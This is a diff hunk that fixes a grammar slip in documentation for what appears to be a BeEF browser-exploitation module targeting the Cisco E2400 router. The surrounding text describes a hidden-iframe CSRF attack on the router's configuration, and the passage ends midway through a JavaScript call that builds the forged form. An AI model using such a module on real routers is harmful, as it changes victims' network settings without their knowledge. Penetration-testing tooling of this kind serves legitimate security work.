@@ -8,7 +8,7 @@
 
 ## Internal Working
 
-Uses an invisible iframe with a POST request to change router configurations. The victim has to be logged into the router for action to succeed.
+Uses an invisible iframe with a POST request to change router configurations. The victim has to be logged into the router for the action to succeed.
 
 ```js
 var cisco_e2400_iframe1_<%= @command_id %> = beef.dom.createIframeXsrfForm(gateway + "apply.cgi", "POST", "application/x-www-form-urlencoded",
